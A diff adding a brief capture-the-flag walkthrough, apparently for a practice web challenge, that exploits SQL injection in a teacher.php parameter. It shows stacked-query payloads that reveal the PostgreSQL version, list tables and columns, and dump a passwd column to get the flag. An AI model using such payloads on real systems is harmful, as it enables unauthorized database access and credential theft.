@@ -1,0 +1,35 @@
+http://edu.kaibro.tw:9487/teacher.php?op=s2&
+td=wang';select+1,2,3,4,5,6,7,8;--
+
+can injection, 因為 1 不見了，猜測是 id 值，不重要，直接設 null;
+
+http://edu.kaibro.tw:9487/teacher.php?op=s2&
+td=wang';select null, version();--
+
+PostgreSQL 11.1 (Debian 11.1-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
+
+確認 sql version，得到 PostgreSQL 11.1
+
+http://edu.kaibro.tw:9487/teacher.php?op=s2
+&td=wang';select null,table_name from information_schema.tables limit 1 offset 0;--
+
+得到 teacher 這個 table，先看裡面有啥
+
+http://edu.kaibro.tw:9487/teacher.php?op=s2
+&td=wang';select null, * from teacher;--
+
+得到 flag
+
+---
+
+http://edu.kaibro.tw:9487/teacher.php?op=s2
+&td=wang'; select null,column_name,null,null from information_schema.columns where
+
+table_name='teacher' limit 1 offset 5; --
+
+Get "passwd" column_name
+
+http://edu.kaibro.tw:9487/teacher.php?op=s2
+&td=wang'; select null,passwd from teacher;--
+
+得到 flag
